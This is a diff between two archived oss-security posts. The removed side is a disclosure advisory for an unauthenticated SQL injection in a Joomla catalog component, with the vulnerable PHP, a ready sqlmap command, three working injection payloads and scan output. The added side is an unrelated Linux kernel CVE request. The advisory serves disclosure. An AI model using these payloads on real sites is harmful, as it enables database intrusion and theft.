@@ -1,50 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/23/3
-Message-id: <2CFDA631-3BD1-43C1-A7EC-100AB9EFEB11@me.com>
-Date: Fri, 23 Sep 2016 03:55:03 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/03/6
+Message-ID: <1614761186.10592613.1478186149176.JavaMail.zimbra@redhat.com>
+Date: Thu, 3 Nov 2016 11:15:49 -0400 (EDT)
+From: Vladis Dronov <vdronov@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla
+Subject: CVE request -- linux kernel: crypto: GPF in lrw_crypt caused by null-deref
 Content-Type: text/plain; charset=utf-8
 
+Hello,
 
-Title: Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla
-Author: Larry W. Cashdollar, @_larry0
-Date: 2016-09-16
-Download Site: http://huge-it.com/joomla-catalog/
-Vendor: huge-it.com
-Vendor Notified: 2016-09-17
-Vendor Contact: info@...e-it.com
-Description: Huge-IT Product Catalog is made for demonstration, sale, advertisements for your products. Imagine a stand with a variety of catalogs with a specific product category. To imagine is not difficult, to use is even easier.
-Vulnerability:
-The following code does not prevent an unauthenticated user from injecting SQL into functions via 'load_more_elements_into_catalog' located in ajax_url.php. Vulnerable Code in : ajax_url.php 11 define('_JEXEC', 1); 12 defined('_JEXEC') or die('Restircted access'); . . . 308 } elseif ($_POST["post"] == "load_more_elements_into_catalog") { 309 $catalog_id = $_POST["catalog_id"]; 310 $old_count = $_POST["old_count"]; 311 $count_into_page = $_POST["count_into_page"]; 312 $show_thumbs = $_POST["show_thumbs"]; 313 $show_description = $_POST["show_description"]; 314 $show_linkbutton = $_POST["show_linkbutton"]; 315 $parmalink = $_POST["parmalink"]; 316 $level = $_POST['level']; . . . 359 $query->select('*'); 360 $query->from('#__huge_it_catalog_products'); 361 $query->where('catalog_id =' . $catalog_id); 362 $query->order('ordering asc'); 363 $db->setQuery($query, $from, $count_into_page);
-CVE-2016-1000125
+We would like to ask for a CVE-ID for the following security flaw.
 
-Exploit Code:
-$ sqlmap -u 'http://example.com/components/com_catalog/ajax_url.php' --data="prod_page=1&post=load_more_elements_into_catalog&catalog_id=*&old_count=*&count_into_page=*&show_thumbs=*&show_description=*&parmalink=*" --level=5 --risk=3
- 
-Parameter: #1* ((custom) POST)
- Type: error-based
- Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
- Payload: prod_page=1&post=load_more_elements_into_catalog&catalog_id=-2369 OR 1 GROUP BY CONCAT(0x717a627871,(SELECT (CASE WHEN (1973=1973) THEN 1 ELSE 0 END)),0x716b787671,FLOOR(RAND(0)*2)) HAVING MIN(0)#&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=
- 
- Type: AND/OR time-based blind
- Title: MySQL >= 5.0.12 time-based blind - Parameter replace
- Payload: prod_page=1&post=load_more_elements_into_catalog&catalog_id=(CASE WHEN (7371=7371) THEN SLEEP(5) ELSE 7371 END)&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=
- 
- Type: UNION query
- Title: Generic UNION query (random number) - 15 columns
- Payload: prod_page=1&post=load_more_elements_into_catalog&catalog_id=-5943 UNION ALL SELECT 2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,CONCAT(0x717a627871,0x494a475477424c724f6f7853556d61597544576f4b614d6e41596771595253476c4251797a685974,0x716b787671)-- FvOy&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=
----
-[16:48:10] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian 8.0 (jessie)
-web application technology: Apache 2.4.10
-back-end DBMS: MySQL >= 5.0.12
-[16:48:10] [WARNING] HTTP error codes detected during run:
-500 (Internal Server Error) - 6637 times
-[16:48:10] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
- 
-[*] shutting down at 16:48:10
- 
+The lrw_crypt() function in 'crypto/lrw.c' in the Linux kernel
+before 4.5 allows local users to cause a system crash and a denial
+of service by the NULL pointer dereference via accept(2) system call
+for AF_ALG socket without calling setkey() first to set a cipher key.
 
-Advisory: http://www.vapidlabs.com/advisory.php?v=171
+Initial discussion:
+https://groups.google.com/forum/#!msg/syzkaller/frb2XrB5aWk/xCXzkIBcDAAJ
+
+Red Hat Product Security Bugzilla:
+https://bugzilla.redhat.com/show_bug.cgi?id=1386286
+
+Initial upstream patch (followed by a set of the related patches):
+https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=dd504589577d8e8e70f51f997ad487a4cb6c026f
+
+Best regards,
+Vladis Dronov | Red Hat, Inc. | Product Security Engineer
